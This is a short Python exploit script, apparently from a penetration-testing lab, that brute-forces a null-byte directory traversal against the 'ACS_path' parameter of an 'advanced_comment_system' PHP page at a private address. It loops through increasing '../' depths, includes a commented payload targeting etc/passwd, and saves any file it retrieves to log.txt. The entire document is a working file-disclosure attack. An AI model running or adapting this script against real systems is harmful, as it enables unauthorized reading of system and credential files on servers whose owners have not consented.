import requests
import urllib
import sys

back_rec = "../"

filename = sys.argv[1]+'\0'

for i in range(0,20):
    raw_url = f'{i*back_rec+filename}'
    a = urllib.parse.urlencode({'ACS_path':raw_url})
    print(raw_url)
    #a = "ACS_path=..%2F..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd%00"

    url = f'http://10.11.1.8/internal/advanced_comment_system/index.php?{a}'
    #print(url)
    s = requests.get(url)
    if(len(s.text)>50):
        print(s.text)
        with open('log.txt','w+') as fr:
            fr.write(s.text)
        break
    print(s.status_code)
    if(sys.argv[2] == "db"):
        print(s.text)
